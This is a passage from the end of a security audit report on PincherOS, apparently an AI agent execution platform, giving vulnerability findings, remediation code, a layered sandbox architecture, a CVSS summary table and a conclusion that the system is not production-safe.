**Issue:** The comment claims the timestamp prevents caching, but the key doesn't include it. In practice, identical events will cache correctly, but the comment/doc mismatch is confusing and the `timestamp` field in `ReflexEvent` serves no purpose for caching.

**Remediation:** Either include the timestamp (for time-sensitive caching) or document why it's excluded.

### 8.6 V-006: Database Schema Has No Integrity Protection (CVSS: 6.1 MEDIUM)

**Location:** `reflex/gastrolith.rs:22-49`

**Issue:** The SQLite database stores pattern actions as JSON strings with no integrity protection. An attacker with filesystem access can modify the database to inject malicious patterns.

**Remediation:**
```rust
// Add an HMAC column to the schema
CREATE TABLE IF NOT EXISTS patterns (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    triggers TEXT NOT NULL,
    action TEXT NOT NULL,
    priority INTEGER NOT NULL,
    enabled INTEGER NOT NULL,
    hmac TEXT NOT NULL  // HMAC-SHA256 over (id||name||triggers||action||priority||enabled)
);
```

### 8.7 V-007: `panic!` in Library Code (CVSS: 5.0 MEDIUM)

**Location:** `reflex/gastrolith.rs:22`, `embed/onnx.rs:26`

```rust
let conn = Connection::open(path).expect("Failed to open gastrolith database");
assert!(path.exists(), "ONNX model not found at {:?}", path);
```

**Issue:** Library code should NEVER panic. These `expect`/`assert` calls will crash the entire PincherOS process on failure.

**Remediation:** Return `Result::Err` instead of panicking.

---

## 9. Recommendations for World-Class Security

### 9.1 Immediate Actions (Block Release)

| Priority | Action | Effort |
|----------|--------|--------|
| P0 | Implement the Veto Engine with regex-based command filtering | 3 days |
| P0 | Implement bubblewrap + Landlock sandbox | 5 days |
| P0 | Add seccomp-BPF syscall filtering | 3 days |
| P0 | Add cgroup v2 resource limits | 2 days |
| P0 | Remove all `unsafe` code blocks or formally verify them | 1 day |
| P1 | Implement capability token system with Ed25519 signing | 5 days |
| P1 | Add HMAC integrity to database and migration files | 2 days |
| P1 | Implement authenticated RPC with peer credential verification | 3 days |
| P1 | Add comprehensive audit logging | 2 days |
| P2 | Commit `Cargo.lock` for reproducible builds | 1 hour |
| P2 | Add `cargo-audit` and `cargo-deny` to CI pipeline | 2 hours |

### 9.2 Defense in Depth Architecture

The recommended security architecture uses **5 independent layers**:

```
┌─────────────────────────────────────────────┐
│  LAYER 5: Hardware-backed Attestation       │
│  (TPM 2.0 / TDX / SGX for agent identity)   │
├─────────────────────────────────────────────┤
│  LAYER 4: MicroVM Isolation                 │
│  (Firecracker / gVisor per agent)           │
├─────────────────────────────────────────────┤
│  LAYER 3: Capability-based Access Control   │
│  (Ed25519 tokens, delegation chains)        │
├─────────────────────────────────────────────┤
│  LAYER 2: System Call Filtering             │
│  (seccomp-BPF + Landlock LSM)               │
├─────────────────────────────────────────────┤
│  LAYER 1: Deterministic Veto Engine         │
│  (Regex rules, command classification)      │
└─────────────────────────────────────────────┘
```

### 9.3 WebAssembly MicroVM Alternative

For the strongest isolation guarantee, consider **WASMtime** for reflex execution:

```rust
use wasmtime::{Engine, Module, Store, Instance};

pub struct WasmSandbox {
    engine: Engine,
    // Pre-compiled, verified WASM modules only
    allowed_modules: HashMap<String, Module>,
}

impl WasmSandbox {
    pub fn execute(&self, module_name: &str, input: &[u8]) -> Result<Vec<u8>, SandboxError> {
        let module = self.allowed_modules.get(module_name)
            .ok_or(SandboxError::ModuleNotAllowed)?;
        
        // WASI capabilities are EXPLICITLY granted:
        // - No filesystem access by default
        // - No network access by default
        // - stdin/stdout/stderr only if explicitly enabled
        let mut store = Store::new(&self.engine, ());
        let instance = Instance::new(&mut store, module, &[])?;
        
        // Call exported function with typed parameters
        let run = instance.get_typed_func::<(), i32>(&mut store, "run")?;
        run.call(&mut store, ())?;
        
        Ok(vec![])
    }
}
```

**Advantages of WASM sandboxing:**
- **Memory safety by construction** — linear memory is bounds-checked
- **No kernel interface** — WASI provides minimal, capability-controlled syscalls
- **Deterministic execution** — no ambient authority, no hidden state
- **Near-native performance** — compiled to native code via Cranelift
- **Universal** — same binary runs on server, edge, browser

### 9.4 Comparison with Industry Best Practices

| Control | PincherOS (Current) | Docker (Baseline) | Firecracker (Target) | WASMtime (Best) |
|---------|---------------------|-------------------|---------------------|-----------------|
| Kernel isolation | **NONE** | Shared kernel | Dedicated kernel | No kernel interface |
| Filesystem isolation | **NONE** | OverlayFS | virtiofs | Capability-scoped |
| Network isolation | **NONE** | veth bridge | virtio-net | None by default |
| Syscall filtering | **NONE** | seccomp | seccomp + full guest | WASI capabilities |
| Resource limits | **NONE** | cgroups v2 | cgroups v2 | Fuel metering |
| Startup time | N/A | ~500ms | ~125ms | ~10ms |
| Memory overhead | N/A | ~10s MB | ~5 MB | ~1 MB |
| Memory safety | Manual | Manual | Manual | **Enforced** |
| Supply chain | No lockfile | Image signing | Secure boot | Reproducible builds |

### 9.5 Security Monitoring and Incident Response

```rust
/// Security event types for audit logging.
pub enum SecurityEvent {
    VetoTriggered { command: String, rule: String },
    SandboxEscapeAttempt { method: String, blocked: bool },
    CapabilityViolation { token: TokenId, reason: String },
    ResourceLimitHit { limit: String, value: u64 },
    ReflexExecuted { pattern: ReflexId, action: String },
    MigrationVerified { pack: PackId, result: VerifyResult },
    RpcAuthFailure { peer: PeerInfo, reason: String },
}

/// Immutable audit log — append-only, signed entries.
pub struct AuditLog {
    entries: Vec<SignedAuditEntry>,
    key: ed25519_dalek::Keypair,
}

impl AuditLog {
    pub fn append(&mut self, event: SecurityEvent) {
        let entry = AuditEntry {
            timestamp: std::time::SystemTime::now(),
            sequence: self.entries.len() as u64,
            event,
        };
        let serialized = serde_json::to_vec(&entry).unwrap();
        let signature = self.key.sign(&serialized);
        
        self.entries.push(SignedAuditEntry {
            data: entry,
            signature,
        });
    }
}
```

---

## 10. Appendix: CVSS Score Summary

| ID | Vulnerability | Severity | CVSS Base | Exploitability |
|----|--------------|----------|-----------|----------------|
| V-001 | Unsafe Send/Sync bypass | HIGH | 7.5 | Local |
| V-002 | NaN in cosine_similarity | MEDIUM | 6.5 | Local |
| V-003 | Uuid::nil() fallback | MEDIUM | 5.5 | Local |
| V-004 | Write lock for read op | MEDIUM | 5.3 | Remote |
| V-005 | Cache key inconsistency | LOW | 4.0 | Local |
| V-006 | Database lacks integrity | MEDIUM | 6.1 | Local |
| V-007 | panic! in library code | MEDIUM | 5.0 | Local |
| G-001 | Veto Engine absent | CRITICAL | 10.0 | Remote |
| G-002 | Sandbox absent | CRITICAL | 10.0 | Remote |
| G-003 | Capability system absent | CRITICAL | 9.8 | Remote |
| G-004 | RPC auth absent | HIGH | 8.0 | Local |
| G-005 | Migration integrity absent | HIGH | 7.8 | Local |
| G-006 | No resource limits | HIGH | 7.5 | Remote |
| G-007 | No Cargo.lock | MEDIUM | 5.5 | Supply chain |
| G-008 | Custom action RCE | CRITICAL | 9.8 | Remote |
| G-009 | Regex deny list bypass | HIGH | 7.5 | Remote |
| G-010 | Cache memory exhaustion | MEDIUM | 6.5 | Remote |

---

## 11. Conclusion

PincherOS is an **alpha-stage prototype with a security architecture that exists only in documentation**. The current codebase:

1. **Declares** 9 security-related modules (`security`, `sandbox`, `capability`, `migration`, `rpc`, `sidecar`, `dynamics`, `resource`, `db`)
2. **Implements** only the reflex engine, embedder, and type definitions
3. **Contains** multiple security vulnerabilities in the implemented code
4. **Lacks** every critical security control required for an AI agent execution platform

**The system is not safe for any use case involving AI-generated commands.** Before any production use, the following MUST be implemented:

1. Full Veto Engine with Unicode normalization
2. Bubblewrap + Landlock + seccomp sandbox
3. Capability-based access control with cryptographic tokens
4. Authenticated RPC between core and sidecar
5. Signed and integrity-protected migration packages
6. Comprehensive resource limits via cgroups and rlimits
7. Immutable audit logging
8. CI-integrated dependency scanning (`cargo-audit`, `cargo-deny`)

The recommended long-term architecture is a **WebAssembly-based sandbox** using WASMtime, which provides memory safety and capability-based security by construction — eliminating entire classes of vulnerabilities that are inherent in native process-based sandboxing.

---

*End of Security Architecture Audit Report*
